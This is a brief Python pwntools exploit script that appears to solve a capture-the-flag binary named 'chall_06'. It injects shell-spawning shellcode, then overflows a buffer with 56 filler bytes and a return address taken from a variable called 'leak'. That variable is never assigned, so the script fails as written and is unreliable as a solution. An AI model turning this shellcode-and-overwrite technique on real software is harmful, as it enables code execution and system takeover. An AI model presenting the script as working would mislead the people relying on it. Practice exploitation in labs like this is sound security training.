from pwn import *

binary = context.binary = ELF('./chall_06')

p = process('./chall_06')
p.recv()

payload  = b''
payload += asm(shellcraft.sh())

p.sendline(payload)

payload  = b''
payload += 56 * b'A'
payload += p64(leak)

p.sendline(payload)
p.interactive()
